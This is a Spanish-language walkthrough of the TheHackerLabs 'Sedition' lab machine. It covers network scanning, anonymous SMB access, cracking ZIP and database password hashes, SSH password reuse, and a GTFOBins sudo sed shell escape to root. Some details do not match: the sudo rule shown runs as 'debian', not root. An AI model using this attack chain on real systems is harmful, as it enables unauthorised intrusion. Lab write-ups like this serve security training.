
# 🕵️ Sedition (TheHackerLabs)

## ⚙️ Herramientas utilizadas

- `arp-scan`
- `nmap`
- `smbclient`
- `john`
- `rpcclient`
- `crackstation`
- `gtfobins`

---

## 🧭 Reconocimiento

### 🔍 Arp-scan

```bash
sudo arp-scan -I eth0 --localnet
```

```text
192.168.1.108   08:00:27:60:6a:ed       (Unknown)
```

- Resultado → la IP víctima es **192.168.1.108**

---

### 🛰️ Ping

```bash
ping -c 1 192.168.1.108
```

```text
PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
64 bytes from 192.168.1.108: icmp_seq=1 ttl=64 time=1.63 ms
```

- Resultado → `ttl=64`, por lo que es una máquina **Linux**.

---

### 🔬 Nmap

```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 192.168.1.108 -oN escaneo.txt
```

```text
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian
```

- Resultado → Se detecta un puerto SSH oculto en el **65535**.

---

## 🗂️ Enumeración SMB

### Listado de shares

```bash
smbclient -L 192.168.1.108 -N
```

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
backup          Disk      
IPC$            IPC       IPC Service (Samba Server)
nobody          Disk      Home Directories
```

- El recurso `backup` es accesible anónimamente y contiene un archivo `secretito.zip`.

### Descarga y análisis del ZIP

```bash
smbclient //192.168.1.108/backup -N
smb: \> get secretito.zip
```

### Crackeo con `john`

```bash
zip2john secretito.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

- Contraseña encontrada: `elbunkermolagollon123`

---

## 👤 Enumeración de usuarios

```bash
rpcclient -U "" -N 192.168.1.108
> querydispinfo
```

- Usuario encontrado: **cowboy**

---

## 🔐 Acceso SSH (puerto 65535)

```bash
ssh cowboy@192.168.1.108 -p 65535
```

- Contraseña: `elbunkermolagollon123`
- Acceso exitoso

---

## 🚀 Escalada de privilegios

### `.bash_history` revela uso de MariaDB

```bash
mariadb -u cowboy -p elbunkermolagollon123
```

Se encuentra el siguiente hash de contraseña para el usuario `debian`:
```text
debian:7c6a180b36896a0a8c02787eeafb0e4c
```

- Se crackea con CrackStation → contraseña: `password1`

### Acceso como `debian`

```bash
ssh debian@192.168.1.108 -p 65535
# Contraseña: password1
```

### Permisos `sudo`

```bash
sudo -l
```

```text
(debian) NOPASSWD: /usr/bin/sed
```

### Ejecución de comando con `sed` (GTFOBins)

```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

- Escalada a `root` exitosa.

---

## 🏁 Flags

```bash
cat /home/debian/flag.txt
cat /root/root.txt
```

---

## ✅ Lecciones aprendidas

- Los servicios ocultos en puertos altos pueden revelar accesos críticos.
- Contraseñas descubiertas en un servicio a menudo son reutilizadas.
- Archivos `.bash_history` y bases de datos pueden contener vectores de escalada.
